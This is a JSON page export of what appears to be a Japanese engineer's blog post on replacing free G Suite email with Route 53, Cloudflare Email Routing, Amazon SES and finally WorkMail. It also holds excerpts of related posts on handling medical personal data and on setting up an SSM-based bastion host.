{"componentChunkName":"component---src-templates-post-tsx","path":"/posts/137","result":{"data":{"esaPost":{"number":137,"relative_category":"blog/backend","fields":{"title":"G Suite無償版停止に伴い、MXレコード等のドメイン管理を整理した","excerpt":"今回は10年以上利用していたG Suite無償版が2022年8月に停止されるとのことで、メールアドレスの管理をどうするか検討しました。メール管理は別のGMailアカウントを使っていたので、転送できれば良いのですが、これを機にドメイン管理をAWSにまとめていくことを思いつきました。   > PROBLEMPROBLEM \n\n- 10年以上利用していたG Suite無償版が2022年8月に停止され、メールアドレスの管理をどうしようか Google Workspaceにアップグレードしても良いけどBusiness Starterプランにしても面白みがないので別の方法を探したい G Suiteはメールしか利用しておらず、メール管理は別のGMailアカウントを使っていたのでメール転送機能で代替できそう \n- Google Workspaceにアップグレードしても良いけどBusiness Starterプランにしても面白みがないので別の方法を探したい G Suiteはメールしか利用しておらず、メール管理は別のGMailアカウントを使っていたのでメール転送機能で代替できそう \n- G Suiteはメールしか利用しておらず、メール管理は別のGMailアカウントを使っていたのでメール転送機能で代替できそう  > SOLUTIONSOLUTION \n\nと言うわけで、今回はG Suiteアカウントの利用を止めて、MXレコード周りを整理することにしました。個人利用なのでドメイン管理は既存のままで良かったのですが、証跡管理のない状況に耐えられずAWSに移管。メール転送機能はPOBOX以外はサブアドレス対応していなかったのですが、キャッチオール対応できるのでまずは良しとしています。現時点での構成は下記の通り。 \n\nなお、複数人数で必要になった場合は、サブアドレスとグループアドレスが対応可能なAmazon Workmailに移管する予定ですが、これでもGoogle Workspaceを利用するよりコストは半分程で済みます。  > 構成構成  > beforebefore \n\n- ドメイン管理 バリュードメイン\n- NSレコード Cloudflare DNS\n- MXレコード G Suite\n- SMTP G Suite  > afterafter \n\n- ドメイン管理 Amazon Route 53\n- NSレコード Amazon Route 53\n- MXレコード Cloudflare Email Routing\n- SMTP Amazon SES  > 手順手順 \n\n方針が決まるまでいくつかメールサービスを検討したのですが、決まってしまえばやることは単純です。  > 1. ドメイン管理を整理する1. ドメイン管理を整理する \n\n基本はドメイン移管申請ですが、G Suiteを後ほど削除することを考慮してMXレコードをCloudflare Email Routingに変更。本来はこの処理の前にG Suiteに紐付いている各サービスの設定変更が必要になります。 \n\n1. 移管元にてWHOIS情報公開代行の解除\n2. 移管元にてドメインロックの解除\n3. 移管元にて認証鍵 (Auth-Code) を確認\n4. 移管先にてホストゾーンの作成、各レコードの内容を移管元に合わせる\n5. Cloudflare Email Routingにて転送先メールアドレスを検証する\n6. 移管先にてMXレコードをCloudflare Email Routingのものを設定する\n7. 移管元のNSレコードを移管先に変更\n8. 移管先にて認証鍵をつかい移管申請を行う\n9. 移管元に対して移管申請を行った旨をメールにて連携する \n\nCf. \n\n- ドメインの他社への移管 | バリュードメイン ユーザーガイド\n- ドメイン登録の Amazon Route 53 への移管 - Amazon Route 53\n- Easily creating and routing email addresses with Cloudflare Email Routing  > 2. SMTPを設定する2. SMTPを設定する \n\n最近はセキュリティ対策のためGMailのSMTPが使いづらくなっているので、今回はAmazon SESを利用しました。サンドボックス解除のため下記の通りサポートに依頼しました。 txt\n\n# メールタイプ 通例の取引がメインとなる予定です # ユースケース ## メールを送信する頻度 週に1-2回 ## 受信者リストのメンテナンス方法 四半期に一度の棚卸し ## バウンス対応 当該メールアドレスの削除 ## 申し立て対応 当該メールアドレスへのフラグ管理 ## 解除申請の管理方法 メールでの受付 ## 送信予定のメールサンプル {{宛先名}}様 お世話になっております。 表題の件につきまして1点問い合わせします。 {{問い合わせ内容}} ご不明な点等ございましたらお気軽にお問い合わせ下さい。 どうぞ、よろしくお願い致します。   > 3. G Suiteを退会する3. G Suiteを退会する \n\nG Suiteに依存しているサービスがないか確認し、退会します。  > WRAPUPWRAPUP \n\n以前からドメイン管理をAWSに移管したかったのですが、積極的な理由がないためなおざりになっていました。今回のG Suite無償版の期限切れに伴い整理できすっきりしたので、これを機にいろいろ整理していきたいですね。  > 後日談後日談 \n\nCloudflare DNSからAmazon Route 53に設定を変更した数日後、Cloudflare Email Routingが使用できなくなりました。転送機能としてドメイン管理から切り離されていると思ったのですがそうではなかったようです。ドメイン管理は厳しめに証跡を取っていきたいところなので、Amazon Route 53による管理は譲れません。 \n\nまた、Amazon SESによる転送機能も検討したのですが、送信元すべてに対してドメイン検証が必要なため現実的ではありませんでした。AWSにはメール転送の種類が2つあって、送信元を転送者に置き換える「転送」と送信元をそのまま利用する「リダイレクト」があります。「転送」だと元の送信元とコミュニケーションが取りづらくなる一方、「リダイレクト」だとすべての送信元のドメイン検証が必要となります。ここでは融通が利かないと判断するのではなく、セキュリティを考慮された実装と捉え、AWSが提供しているWorkMailを素直に使うことにしました。慣れればたいしたことはありません。下記が結果になります。  > beforebefore \n\n- ドメイン管理 Amazon Route 53\n- NSレコード Amazon Route 53\n- MXレコード Cloudflare Email Routing\n- SMTP Amazon SES  > afterafter \n\n- ドメイン管理 Amazon Route 53\n- NSレコード Amazon Route 53\n- MXレコード Amazon WorkMail\n- SMTP Amazon WorkMail","thumbnail":"https://img.esa.io/uploads/production/attachments/16651/2022/04/13/97367/51630abf-d1d2-4244-bf28-7820c1072275.jpg"},"wip":false,"body_md":"今回は10年以上利用していた[G Suite無償版が2022年8月に停止される](https://support.google.com/a/answer/60217)とのことで、メールアドレスの管理をどうするか検討しました。メール管理は別のGMailアカウントを使っていたので、転送できれば良いのですが、これを機にドメイン管理をAWSにまとめていくことを思いつきました。\r\n\r\n<img width=\"952\" alt=\"thumbnail\" src=\"https://img.esa.io/uploads/production/attachments/16651/2022/04/13/97367/51630abf-d1d2-4244-bf28-7820c1072275.jpg\">\r\n\r\n# PROBLEM\r\n- 10年以上利用していたG Suite無償版が2022年8月に停止され、メールアドレスの管理をどうしようか\r\n    - Google Workspaceにアップグレードしても良いけどBusiness Starterプランにしても面白みがないので別の方法を探したい\r\n        - G Suiteはメールしか利用しておらず、メール管理は別のGMailアカウントを使っていたのでメール転送機能で代替できそう\r\n\r\n# SOLUTION\r\nと言うわけで、今回はG Suiteアカウントの利用を止めて、MXレコード周りを整理することにしました。個人利用なのでドメイン管理は既存のままで良かったのですが、証跡管理のない状況に耐えられずAWSに移管。メール転送機能はPOBOX以外はサブアドレス対応していなかったのですが、キャッチオール対応できるのでまずは良しとしています。現時点での構成は下記の通り。\r\n\r\nなお、複数人数で必要になった場合は、サブアドレスとグループアドレスが対応可能なAmazon Workmailに移管する予定ですが、これでもGoogle Workspaceを利用するよりコストは半分程で済みます。\r\n\r\n## 構成\r\n### before\r\n- ドメイン管理 バリュードメイン\r\n- NSレコード Cloudflare DNS\r\n- MXレコード G Suite\r\n- SMTP G Suite\r\n\r\n### after\r\n- ドメイン管理 Amazon Route 53\r\n- NSレコード Amazon Route 53\r\n- MXレコード Cloudflare Email Routing\r\n- SMTP Amazon SES\r\n\r\n## 手順\r\n方針が決まるまでいくつかメールサービスを検討したのですが、決まってしまえばやることは単純です。\r\n\r\n### 1. ドメイン管理を整理する\r\n基本はドメイン移管申請ですが、G Suiteを後ほど削除することを考慮してMXレコードをCloudflare Email Routingに変更。本来はこの処理の前にG Suiteに紐付いている各サービスの設定変更が必要になります。\r\n\r\n1. 移管元にてWHOIS情報公開代行の解除\r\n2. 移管元にてドメインロックの解除\r\n3. 移管元にて認証鍵 (Auth-Code) を確認\r\n4. 移管先にてホストゾーンの作成、各レコードの内容を移管元に合わせる\r\n5. Cloudflare Email Routingにて転送先メールアドレスを検証する\r\n6. 移管先にてMXレコードをCloudflare Email Routingのものを設定する\r\n7. 移管元のNSレコードを移管先に変更\r\n8. 移管先にて認証鍵をつかい移管申請を行う\r\n9. 移管元に対して移管申請を行った旨をメールにて連携する\r\n\r\nCf.\r\n- [ドメインの他社への移管 | バリュードメイン ユーザーガイド](https://www.value-domain.com/userguide/manual/transferother)\r\n- [ドメイン登録の Amazon Route 53 への移管 - Amazon Route 53](https://docs.aws.amazon.com/ja_jp/Route53/latest/DeveloperGuide/domain-transfer-to-route-53.html#domain-transfer-to-route-53-request-transfer)\r\n- [Easily creating and routing email addresses with Cloudflare Email Routing](https://blog.cloudflare.com/introducing-email-routing/)\r\n\r\n### 2. SMTPを設定する\r\n最近はセキュリティ対策のためGMailのSMTPが使いづらくなっているので、今回はAmazon SESを利用しました。サンドボックス解除のため下記の通りサポートに依頼しました。\r\n\r\n```txt\r\n# メールタイプ\r\n通例の取引がメインとなる予定です\r\n\r\n# ユースケース\r\n## メールを送信する頻度\r\n週に1-2回\r\n\r\n## 受信者リストのメンテナンス方法\r\n四半期に一度の棚卸し\r\n\r\n## バウンス対応\r\n当該メールアドレスの削除\r\n\r\n## 申し立て対応\r\n当該メールアドレスへのフラグ管理\r\n\r\n## 解除申請の管理方法\r\nメールでの受付\r\n\r\n## 送信予定のメールサンプル\r\n{{宛先名}}様\r\nお世話になっております。\r\n表題の件につきまして1点問い合わせします。\r\n{{問い合わせ内容}}\r\nご不明な点等ございましたらお気軽にお問い合わせ下さい。\r\nどうぞ、よろしくお願い致します。\r\n```\r\n\r\n## 3. G Suiteを退会する\r\nG Suiteに依存しているサービスがないか確認し、退会します。\r\n\r\n# WRAPUP\r\n以前からドメイン管理をAWSに移管したかったのですが、積極的な理由がないためなおざりになっていました。今回のG Suite無償版の期限切れに伴い整理できすっきりしたので、これを機にいろいろ整理していきたいですね。\r\n\r\n## 後日談\r\nCloudflare DNSからAmazon Route 53に設定を変更した数日後、Cloudflare Email Routingが使用できなくなりました。転送機能としてドメイン管理から切り離されていると思ったのですがそうではなかったようです。ドメイン管理は厳しめに証跡を取っていきたいところなので、Amazon Route 53による管理は譲れません。\r\n\r\nまた、Amazon SESによる転送機能も検討したのですが、送信元すべてに対してドメイン検証が必要なため現実的ではありませんでした。AWSにはメール転送の種類が2つあって、送信元を転送者に置き換える「転送」と送信元をそのまま利用する「リダイレクト」があります。「転送」だと元の送信元とコミュニケーションが取りづらくなる一方、「リダイレクト」だとすべての送信元のドメイン検証が必要となります。ここでは融通が利かないと判断するのではなく、セキュリティを考慮された実装と捉え、AWSが提供しているWorkMailを素直に使うことにしました。慣れればたいしたことはありません。下記が結果になります。\r\n\r\n### before\r\n- ドメイン管理 Amazon Route 53\r\n- NSレコード Amazon Route 53\r\n- MXレコード Cloudflare Email Routing\r\n- SMTP Amazon SES\r\n\r\n## after\r\n- ドメイン管理 Amazon Route 53\r\n- NSレコード Amazon Route 53\r\n- MXレコード Amazon WorkMail\r\n- SMTP Amazon WorkMail\r\n","body_html":"<p data-sourcepos=\"1:1-1:421\">今回は10年以上利用していた<a href=\"https://support.google.com/a/answer/60217\" target=\"_blank\" rel=\"noopener noreferrer\">G Suite無償版が2022年8月に停止される</a>とのことで、メールアドレスの管理をどうするか検討しました。メール管理は別のGMailアカウントを使っていたので、転送できれば良いのですが、これを機にドメイン管理をAWSにまとめていくことを思いつきました。</p>\n<a href=\"https://img.esa.io/uploads/production/attachments/16651/2022/04/13/97367/51630abf-d1d2-4244-bf28-7820c1072275.jpg\" target=\"_blank\" rel=\"noopener noreferrer\"><img width=\"952\" alt=\"thumbnail\" src=\"https://img.esa.io/uploads/production/attachments/16651/2022/04/13/97367/51630abf-d1d2-4244-bf28-7820c1072275.jpg\"></a>\n<h1 data-sourcepos=\"5:1-5:9\" id=\"1-0-0\" name=\"1-0-0\"><a class=\"anchor\" id=\"PROBLEM\" name=\"PROBLEM\" href=\"#PROBLEM\" data-position=\"1-0-0\"><i class=\"fa fa-link\"></i><span class=\"hidden\" data-text=\"PROBLEM\"> &gt; PROBLEM</span></a>PROBLEM</h1>\n<ul data-sourcepos=\"6:1-9:0\">\n<li data-sourcepos=\"6:1-9:0\">10年以上利用していたG Suite無償版が2022年8月に停止され、メールアドレスの管理をどうしようか\n<ul data-sourcepos=\"7:5-9:0\">\n<li data-sourcepos=\"7:5-9:0\">Google Workspaceにアップグレードしても良いけどBusiness Starterプランにしても面白みがないので別の方法を探したい\n<ul data-sourcepos=\"8:9-9:0\">\n<li data-sourcepos=\"8:9-9:0\">G Suiteはメールしか利用しておらず、メール管理は別のGMailアカウントを使っていたのでメール転送機能で代替できそう</li>\n</ul></li>\n</ul></li>\n</ul>\n<h1 data-sourcepos=\"10:1-10:10\" id=\"2-0-0\" name=\"2-0-0\"><a class=\"anchor\" id=\"SOLUTION\" name=\"SOLUTION\" href=\"#SOLUTION\" data-position=\"2-0-0\"><i class=\"fa fa-link\"></i><span class=\"hidden\" data-text=\"SOLUTION\"> &gt; SOLUTION</span></a>SOLUTION</h1>\n<p data-sourcepos=\"11:1-11:500\">と言うわけで、今回はG Suiteアカウントの利用を止めて、MXレコード周りを整理することにしました。個人利用なのでドメイン管理は既存のままで良かったのですが、証跡管理のない状況に耐えられずAWSに移管。メール転送機能はPOBOX以外はサブアドレス対応していなかったのですが、キャッチオール対応できるのでまずは良しとしています。現時点での構成は下記の通り。</p>\n<p data-sourcepos=\"13:1-13:253\">なお、複数人数で必要になった場合は、サブアドレスとグループアドレスが対応可能なAmazon Workmailに移管する予定ですが、これでもGoogle Workspaceを利用するよりコストは半分程で済みます。</p>\n<h2 data-sourcepos=\"15:1-15:9\" id=\"2-1-0\" name=\"2-1-0\"><a class=\"anchor\" id=\"構成\" name=\"構成\" href=\"#構成\" data-position=\"2-1-0\"><i class=\"fa fa-link\"></i><span class=\"hidden\" data-text=\"構成\"> &gt; 構成</span></a>構成</h2>\n<h3 data-sourcepos=\"16:1-16:10\" id=\"2-1-1\" name=\"2-1-1\"><a class=\"anchor\" id=\"before\" name=\"before\" href=\"#before\" data-position=\"2-1-1\"><i class=\"fa fa-link\"></i><span class=\"hidden\" data-text=\"before\"> &gt; before</span></a>before</h3>\n<ul data-sourcepos=\"17:1-21:0\">\n<li data-sourcepos=\"17:1-17:45\">ドメイン管理 バリュードメイン</li>\n<li data-sourcepos=\"18:1-18:31\">NSレコード Cloudflare DNS</li>\n<li data-sourcepos=\"19:1-19:24\">MXレコード G Suite</li>\n<li data-sourcepos=\"20:1-21:0\">SMTP G Suite</li>\n</ul>\n<h3 data-sourcepos=\"22:1-22:9\" id=\"2-1-2\" name=\"2-1-2\"><a class=\"anchor\" id=\"after\" name=\"after\" href=\"#after\" data-position=\"2-1-2\"><i class=\"fa fa-link\"></i><span class=\"hidden\" data-text=\"after\"> &gt; after</span></a>after</h3>\n<ul data-sourcepos=\"23:1-27:0\">\n<li data-sourcepos=\"23:1-23:36\">ドメイン管理 Amazon Route 53</li>\n<li data-sourcepos=\"24:1-24:32\">NSレコード Amazon Route 53</li>\n<li data-sourcepos=\"25:1-25:41\">MXレコード Cloudflare Email Routing</li>\n<li data-sourcepos=\"26:1-27:0\">SMTP Amazon SES</li>\n</ul>\n<h2 data-sourcepos=\"28:1-28:9\" id=\"2-2-0\" name=\"2-2-0\"><a class=\"anchor\" id=\"手順\" name=\"手順\" href=\"#手順\" data-position=\"2-2-0\"><i class=\"fa fa-link\"></i><span class=\"hidden\" data-text=\"手順\"> &gt; 手順</span></a>手順</h2>\n<p data-sourcepos=\"29:1-29:141\">方針が決まるまでいくつかメールサービスを検討したのですが、決まってしまえばやることは単純です。</p>\n<h3 data-sourcepos=\"31:1-31:40\" id=\"2-2-1\" name=\"2-2-1\"><a class=\"anchor\" id=\"1. ドメイン管理を整理する\" name=\"1. ドメイン管理を整理する\" href=\"#1. ドメイン管理を整理する\" data-position=\"2-2-1\"><i class=\"fa fa-link\"></i><span class=\"hidden\" data-text=\"1. ドメイン管理を整理する\"> &gt; 1. ドメイン管理を整理する</span></a>1. ドメイン管理を整理する</h3>\n<p data-sourcepos=\"32:1-32:265\">基本はドメイン移管申請ですが、G Suiteを後ほど削除することを考慮してMXレコードをCloudflare Email Routingに変更。本来はこの処理の前にG Suiteに紐付いている各サービスの設定変更が必要になります。</p>\n<ol data-sourcepos=\"34:1-43:0\">\n<li data-sourcepos=\"34:1-34:50\">移管元にてWHOIS情報公開代行の解除</li>\n<li data-sourcepos=\"35:1-35:48\">移管元にてドメインロックの解除</li>\n<li data-sourcepos=\"36:1-36:49\">移管元にて認証鍵 (Auth-Code) を確認</li>\n<li data-sourcepos=\"37:1-37:99\">移管先にてホストゾーンの作成、各レコードの内容を移管元に合わせる</li>\n<li data-sourcepos=\"38:1-38:78\">Cloudflare Email Routingにて転送先メールアドレスを検証する</li>\n<li data-sourcepos=\"39:1-39:83\">移管先にてMXレコードをCloudflare Email Routingのものを設定する</li>\n<li data-sourcepos=\"40:1-40:50\">移管元のNSレコードを移管先に変更</li>\n<li data-sourcepos=\"41:1-41:60\">移管先にて認証鍵をつかい移管申請を行う</li>\n<li data-sourcepos=\"42:1-43:0\">移管元に対して移管申請を行った旨をメールにて連携する</li>\n</ol>\n<p data-sourcepos=\"44:1-44:3\">Cf.</p>\n<ul data-sourcepos=\"45:1-48:0\">\n<li data-sourcepos=\"45:1-45:147\"><a href=\"https://www.value-domain.com/userguide/manual/transferother\" target=\"_blank\" rel=\"noopener noreferrer\">ドメインの他社への移管 | バリュードメイン ユーザーガイド</a></li>\n<li data-sourcepos=\"46:1-46:217\"><a href=\"https://docs.aws.amazon.com/ja_jp/Route53/latest/DeveloperGuide/domain-transfer-to-route-53.html#domain-transfer-to-route-53-request-transfer\" target=\"_blank\" rel=\"noopener noreferrer\">ドメイン登録の Amazon Route&nbsp;53 への移管 - Amazon Route&nbsp;53</a></li>\n<li data-sourcepos=\"47:1-48:0\"><a href=\"https://blog.cloudflare.com/introducing-email-routing/\" target=\"_blank\" rel=\"noopener noreferrer\">Easily creating and routing email addresses with Cloudflare Email Routing</a></li>\n</ul>\n<h3 data-sourcepos=\"49:1-49:26\" id=\"2-2-2\" name=\"2-2-2\"><a class=\"anchor\" id=\"2. SMTPを設定する\" name=\"2. SMTPを設定する\" href=\"#2. SMTPを設定する\" data-position=\"2-2-2\"><i class=\"fa fa-link\"></i><span class=\"hidden\" data-text=\"2. SMTPを設定する\"> &gt; 2. SMTPを設定する</span></a>2. SMTPを設定する</h3>\n<p data-sourcepos=\"50:1-50:226\">最近はセキュリティ対策のためGMailのSMTPが使いづらくなっているので、今回はAmazon SESを利用しました。サンドボックス解除のため下記の通りサポートに依頼しました。</p>\n<div class=\"code-block\" data-sourcepos=\"52:1-79:3\"><div class=\"code-filename\"><i class=\"fa fa-file-code-o\"></i>txt</div><div class=\"highlight\"><pre class=\"highlight plaintext\"><code># メールタイプ\n通例の取引がメインとなる予定です\n\n# ユースケース\n## メールを送信する頻度\n週に1-2回\n\n## 受信者リストのメンテナンス方法\n四半期に一度の棚卸し\n\n## バウンス対応\n当該メールアドレスの削除\n\n## 申し立て対応\n当該メールアドレスへのフラグ管理\n\n## 解除申請の管理方法\nメールでの受付\n\n## 送信予定のメールサンプル\n{{宛先名}}様\nお世話になっております。\n表題の件につきまして1点問い合わせします。\n{{問い合わせ内容}}\nご不明な点等ございましたらお気軽にお問い合わせ下さい。\nどうぞ、よろしくお願い致します。\n</code></pre></div></div>\n<h2 data-sourcepos=\"81:1-81:28\" id=\"2-3-0\" name=\"2-3-0\"><a class=\"anchor\" id=\"3. G Suiteを退会する\" name=\"3. G Suiteを退会する\" href=\"#3. G Suiteを退会する\" data-position=\"2-3-0\"><i class=\"fa fa-link\"></i><span class=\"hidden\" data-text=\"3. G Suiteを退会する\"> &gt; 3. G Suiteを退会する</span></a>3. G Suiteを退会する</h2>\n<p data-sourcepos=\"82:1-82:82\">G Suiteに依存しているサービスがないか確認し、退会します。</p>\n<h1 data-sourcepos=\"84:1-84:8\" id=\"3-0-0\" name=\"3-0-0\"><a class=\"anchor\" id=\"WRAPUP\" name=\"WRAPUP\" href=\"#WRAPUP\" data-position=\"3-0-0\"><i class=\"fa fa-link\"></i><span class=\"hidden\" data-text=\"WRAPUP\"> &gt; WRAPUP</span></a>WRAPUP</h1>\n<p data-sourcepos=\"85:1-85:298\">以前からドメイン管理をAWSに移管したかったのですが、積極的な理由がないためなおざりになっていました。今回のG Suite無償版の期限切れに伴い整理できすっきりしたので、これを機にいろいろ整理していきたいですね。</p>\n<h2 data-sourcepos=\"87:1-87:12\" id=\"3-1-0\" name=\"3-1-0\"><a class=\"anchor\" id=\"後日談\" name=\"後日談\" href=\"#後日談\" data-position=\"3-1-0\"><i class=\"fa fa-link\"></i><span class=\"hidden\" data-text=\"後日談\"> &gt; 後日談</span></a>後日談</h2>\n<p data-sourcepos=\"88:1-88:401\">Cloudflare DNSからAmazon Route 53に設定を変更した数日後、Cloudflare Email Routingが使用できなくなりました。転送機能としてドメイン管理から切り離されていると思ったのですがそうではなかったようです。ドメイン管理は厳しめに証跡を取っていきたいところなので、Amazon Route 53による管理は譲れません。</p>\n<p data-sourcepos=\"90:1-90:835\">また、Amazon SESによる転送機能も検討したのですが、送信元すべてに対してドメイン検証が必要なため現実的ではありませんでした。AWSにはメール転送の種類が2つあって、送信元を転送者に置き換える「転送」と送信元をそのまま利用する「リダイレクト」があります。「転送」だと元の送信元とコミュニケーションが取りづらくなる一方、「リダイレクト」だとすべての送信元のドメイン検証が必要となります。ここでは融通が利かないと判断するのではなく、セキュリティを考慮された実装と捉え、AWSが提供しているWorkMailを素直に使うことにしました。慣れればたいしたことはありません。下記が結果になります。</p>\n<h3 data-sourcepos=\"92:1-92:10\" id=\"3-1-1\" name=\"3-1-1\"><a class=\"anchor\" id=\"before-1\" name=\"before-1\" href=\"#before-1\" data-position=\"3-1-1\"><i class=\"fa fa-link\"></i><span class=\"hidden\" data-text=\"before\"> &gt; before</span></a>before</h3>\n<ul data-sourcepos=\"93:1-97:0\">\n<li data-sourcepos=\"93:1-93:36\">ドメイン管理 Amazon Route 53</li>\n<li data-sourcepos=\"94:1-94:32\">NSレコード Amazon Route 53</li>\n<li data-sourcepos=\"95:1-95:41\">MXレコード Cloudflare Email Routing</li>\n<li data-sourcepos=\"96:1-97:0\">SMTP Amazon SES</li>\n</ul>\n<h2 data-sourcepos=\"98:1-98:8\" id=\"3-2-0\" name=\"3-2-0\"><a class=\"anchor\" id=\"after-1\" name=\"after-1\" href=\"#after-1\" data-position=\"3-2-0\"><i class=\"fa fa-link\"></i><span class=\"hidden\" data-text=\"after\"> &gt; after</span></a>after</h2>\n<ul data-sourcepos=\"99:1-102:22\">\n<li data-sourcepos=\"99:1-99:36\">ドメイン管理 Amazon Route 53</li>\n<li data-sourcepos=\"100:1-100:32\">NSレコード Amazon Route 53</li>\n<li data-sourcepos=\"101:1-101:32\">MXレコード Amazon WorkMail</li>\n<li data-sourcepos=\"102:1-102:22\">SMTP Amazon WorkMail</li>\n</ul>\n","tags":["gsuite","google-workspace","cloudflare","amazon-ses","amazon-workmail"],"updated_at":"2022-04-17T15:48:38+09:00","childPublishedDate":{"published_on":"2022-04-12T00:00:00.000Z"},"updated_by":{"name":"なびの👷","screen_name":"nabinno","icon":"https://img.esa.io/uploads/production/members/94286/icon/thumb_m_ef5f024307008aa399b91f87fa5f64e8.jpg"}},"relatedPosts":{"edges":[{"node":{"number":139,"relative_category":"blog/backend","fields":{"title":"ヘルステック界隈のエンジニアが気をつけるべき個人情報の扱い","excerpt":"ヘルステックでエンジニアをしている方であればデータの扱いには苦労していることと思います。CISOがつくったデータセグメンテーションがどういう意図で成り立っているのか、整理されていない現場だと読み解きに時間がかかります。現場に入って早々 何も知らないエンジニアとしては、緩めな方針よりは保守的に設計していく方が後々のトラブルが少なく安全です。   > PROBLEMPROBLEM \n\n- 要配慮個人情報について、厚労省医政局発「医療情報システムの安全管理に関するガイドライン」1を見ると「 医療・健康情報を[..]医師等以外の者が分析等を実施することは許されるものではない 」と書かれている ここでいう「 医療・健康情報 」は要配慮個人情報の中の具体的に何を指しているのか分かりづらい 「 医師等 」の「 等 」が何を指すのか分かりづらい 厚労省医政局の発令0912001号「診療情報の提供等に関する指針」2から推察するに、「 医療・健康情報 」は診療録、「 医師等 」は医療系有資格者を指している 医療系有資格者については、個人情報保護法の関連で出された医療・介護分野用「医療・介護関係事業者における個人情報の適切な取扱いのためのガイダンス」に掲載されている守秘義務対象 \n- ここでいう「 医療・健康情報 」は要配慮個人情報の中の具体的に何を指しているのか分かりづらい\n- 「 医師等 」の「 等 」が何を指すのか分かりづらい\n- 厚労省医政局の発令0912001号「診療情報の提供等に関する指針」2から推察するに、「 医療・健康情報 」は診療録、「 医師等 」は医療系有資格者を指している 医療系有資格者については、個人情報保護法の関連で出された医療・介護分野用「医療・介護関係事業者における個人情報の適切な取扱いのためのガイダンス」に掲載されている守秘義務対象 \n- 医療系有資格者については、個人情報保護法の関連で出された医療・介護分野用「医療・介護関係事業者における個人情報の適切な取扱いのためのガイダンス」に掲載されている守秘義務対象\n- また、データアクセス対象を緩めると、教育が不十分な人が故意に流出させ刑法上の秘密漏示罪3に問われる可能性がある 秘密漏示罪は身分犯ではあるが歯科医師のように解釈の余地もあり範囲が不透明 \n- 秘密漏示罪は身分犯ではあるが歯科医師のように解釈の余地もあり範囲が不透明  > SOLUTIONSOLUTION \n\nというわけで、ヘルステックに関わる個人情報の扱いを整理してみました。 \n\n課題は上記の通りで、時代の流れとともに医療情報の整備が進んでいる状況です。善管注意の責務を負ったエンジニアとしては医療系有資格者以外への診療録の情報提供は、例え、同僚であっても連結可能匿名（仮名加工）ではなく匿名加工で対応すべきでしょう。ゆくゆくは会社として次世代医療基盤法4を適用し、医療分野の研究開発に資するよう体制を構築することが望ましいと考えています。  > 加工なし加工なし \n\n学術研究をのぞき第三者提供は本人同意が必要となるため、ユースケースは限定されます。各々の個人情報の種類によりアクセス出来る人が変わってきます。また、守秘義務が課せらる範囲が広く、行為によっては秘密漏示罪や不正アクセス禁止法5の罰則の対象になります。     診療録 診療録を除いた要配慮個人情報 要配慮個人情報を除いた個人情報     使用場所 社内 (医療関連有資格者) 社内 社内, 社外   利用目的の必要性 (公表有無) 必要 必要 必要   利用目的の必要性 (変更可否) 関連性を有する合理的な範囲 関連性を有する合理的な範囲 関連性を有する合理的な範囲   目的外利用 不可 不可 不可   第三者提供 (可否) 可 可 可   第三者提供 (本人同意) 必要 (オプトインのみ) 必要 (オプトインのみ) 必要 (オプトアウト)   個人の開示請求 応じる 応じる 応じる   漏洩時の報告 必須 必須 必須     > 仮名加工仮名加工 \n\n診療録に関する規定は次世代医療基盤法でまとめられているので、あえて規定が曖昧な仮名加工（連結可能匿名）をつかうのは望ましくありません。ユースケースとして要配慮個人情報を除いた個人情報の統計分析に限られるでしょう。     診療録を除いた要配慮個人情報 要配慮個人情報を除いた個人情報     使用場所 社内 社内   利用目的の必要性 (公表有無) 必要 必要   利用目的の必要性 (変更可否) 際限なく変更可能 際限なく変更可能   目的外利用 不可 不可   第三者提供 (可否) 不可 不可   個人の開示請求 応じない 応じない   漏洩時の報告 なし なし     > 匿名加工匿名加工 \n\n診療録は本人のオプトアウトありですが、基本本人同意なしで利用可能です。ただ、診療録は可変長文字列の上、特異な記述として最も気をつける対象になります。データマスキングの実装は手厚く行っていく必要があります。     診療録を含んだ要配慮個人情報 要配慮個人情報を除いた個人情報     使用場所 社内, 社外 社内, 社外   利用目的の必要性 (公表有無) 不要 不要   第三者提供 (可否) 可 可   第三者提供 (本人同意) 不要 (オプトアウトあり) 不要   個人の開示請求 応じない 応じない   漏洩時の報告 なし なし     > WRAPUPWRAPUP \n\nポイントをかいつまんでまとめてみました。エンジニア視点のため、考慮漏れの箇所があるかも知れませんが、フィードバックや各種レギュレーションの経過を元に更新していければと思います。  \n\n1. https://www.mhlw.go.jp/stf/shingi/0000516275.html ↩ \n2. https://www.mhlw.go.jp/web/t_doc?dataId=00tb3403&dataType=1&page%20No=1 ↩ \n3. https://elaws.e-gov.go.jp/document?lawid=140AC0000000045 ↩ \n4. https://elaws.e-gov.go.jp/document?lawid=429AC0000000028 ↩ \n5. https://elaws.e-gov.go.jp/document?lawid=411AC0000000128 ↩"},"name":"[2022-04-24]ヘルステック界隈のエンジニアが気をつけるべき個人情報の扱い","tags":["privacy","data-masking","data-engineering","health-informatics"],"childPublishedDate":{"published_on":"2022-04-24T00:00:00.000Z","published_on_unix":1650758400}}},{"node":{"number":119,"relative_category":"blog/backend","fields":{"title":"踏み台をSSM Session ManagerとAWS SSOで実現する","excerpt":"踏み台のユーザーが増えてきたため公開鍵管理や監視と運用負荷が上がってきました。オペミスが発生しやすい上 監査的な意味で無視できない状況になってきたので重い腰を上げることにしました。   > PROBLEMPROBLEM \n\n- EC2インスタンスの踏み台運用がつらい 公開鍵管理がつらい 提出・設定・確認ともに運用コストがかかる AWSアカウント数 x ユーザー数で指数関数的に運用コストが増していくことが想定される インフラ管理が分散していると、提出側・設定側ともに重複コストが発生する 監視運用がつらい 定期的に踏み台がブルートフォース攻撃を受けており、脅威が低いとは言えストレスがかかる 踏み台アクセスへの監査ログが不十分 \n- 公開鍵管理がつらい 提出・設定・確認ともに運用コストがかかる AWSアカウント数 x ユーザー数で指数関数的に運用コストが増していくことが想定される インフラ管理が分散していると、提出側・設定側ともに重複コストが発生する \n- 提出・設定・確認ともに運用コストがかかる\n- AWSアカウント数 x ユーザー数で指数関数的に運用コストが増していくことが想定される\n- インフラ管理が分散していると、提出側・設定側ともに重複コストが発生する\n- 監視運用がつらい 定期的に踏み台がブルートフォース攻撃を受けており、脅威が低いとは言えストレスがかかる 踏み台アクセスへの監査ログが不十分 \n- 定期的に踏み台がブルートフォース攻撃を受けており、脅威が低いとは言えストレスがかかる\n- 踏み台アクセスへの監査ログが不十分  > SOLUTIONSOLUTION \n\nというわけで、Session ManagerとSSOでアクセス管理の効率化を狙います。  > 踏み台サーバーの設定踏み台サーバーの設定 \n\nまず、データフローとしては下記の図の通りで、今回はプライベートサブネット上にEC2を置いて素のSession ManagerでDBへの接続することにします。当該インスタンスは AmazonSSMManagedInstanceCore 